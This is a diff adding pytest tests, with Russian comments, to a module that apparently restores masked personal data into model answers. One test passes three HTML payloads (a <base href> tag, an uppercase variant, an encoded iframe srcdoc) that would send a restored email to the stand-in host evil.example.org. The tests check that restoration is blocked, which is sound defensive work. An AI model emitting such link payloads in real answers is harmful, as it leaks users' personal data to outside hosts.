@@ -864,3 +864,18 @@ def test_long_tail_without_spaces_is_released_before_an_unfinished_replacement(s
     assert shown.endswith('"who":"') and "PERSON" not in shown
     assert restorer.feed('0>"}').endswith('"who":"Пётр Сидоров"}')       # «"}» закрыли замену — хвост отдан
     assert restorer.finish().text == restorer.feed("")
+
+
+@pytest.mark.parametrize("answer", [
+    '<base href="https://evil.example.org/"><img src="p?q=<EMAIL_1>">',
+    '<BASE HREF=//evil.example.org/>[ссылка](/p?q=<EMAIL_1>)',
+    '<iframe srcdoc="<img src=&quot;&amp;#47;&amp;#47;evil.example.org/?q=<EMAIL_1>&quot;>"></iframe>',
+])
+def test_base_tag_and_srcdoc_keep_labels(settings, answer):
+    """Ревью восстановления: <base> перенаправляет адреса без узла, srcdoc раскрывает ссылки на знаки дважды."""
+    result = restore(link_state(), answer, settings)
+    assert "ivanov@contoso.ru" not in result.text and "foreign_link" in kinds(result)
+
+
+def test_relative_link_without_a_base_tag_still_restores(settings):
+    assert "ivanov@contoso.ru" in restore(link_state(), '<img src="p?q=<EMAIL_1>"> база данных <basement>', settings).text
